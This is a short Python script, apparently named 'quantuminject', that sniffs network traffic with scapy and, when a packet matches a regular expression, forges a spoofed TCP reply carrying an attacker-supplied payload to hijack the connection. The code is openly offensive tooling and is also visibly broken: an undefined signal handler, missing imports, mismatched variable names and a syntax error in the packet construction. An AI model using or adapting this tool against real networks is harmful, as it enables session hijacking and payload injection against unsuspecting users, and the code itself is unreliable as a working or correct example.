#!/usr/bin/env python
import argparse
import re
import scapy
import signal
import sys


def safe_close(signal, frame):
        print('User requested to close ')
        sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def inject_main(interface, regexp, datafile, exp):
	response_file = open(args.datafile,'r')
	response = response_file.read()
	response.close()
	regex_engine = re.compile(regexp)
	sniff(
		iface=interface,
		filter=exp,
		prn=lambda packet: _process_packet(packet, regex_engine, exp)
		)

def _process_packet(packet, regexp, response):
	if(_is_target_packet(packet, regex_engine)):
		_inject_reply(packet, response)

def _is_target_packet(packet, regex_engine):
	#Apply the regex matching to the packet only if it is tcp
	return re.search(regex_engine, packet[TCP][Raw].load)

def _inject_reply(packet, response_payload):
	loaded_response =  
	Ether(
		src		=	packet[IP].dst,
		dst 	=	packet[IP].src
		)
	/ IP(
		src 	=	packet[IP].dst,
		dst 	=	packet[IP].src,
		id 		=	packet[IP].id + 42
		) 
	/ TCP(
		sport	=	packet[TCP].dport,
		dport	=	packet[TCP].sport,
		ack 	= 	packet[TCP].seq + len(packet[Raw]),
		seq 	= 	packet[TCP].ack,
		) 
	/ response_payload

	sendp(loaded_response)




if __name__ == "__main__":
	parser = argparse.ArgumentParser()
	"""
	quantuminject [­i interface] [­r regexp] [­d datafile] expression
	"""
	parser.add_argument("-i", "--interface", default="eth0",
		help="Target Network interface to intercept traffic")
	parser.add_argument("-r", "--regexp",
		help="A regular expression to filter out packets")
	parser.add_argument("-d", "--datafile", 
		help="The fake payload to be injected as response")
	parser.add_argument("exp", default="tcp and port 80", 
		help="A berkeley packet filter describing the packets to be captured")
	#Parse the command line arguments
	args = parser.parse_args()
	inject_main(args.interface, args.regexp, args.datafile, args.exp)
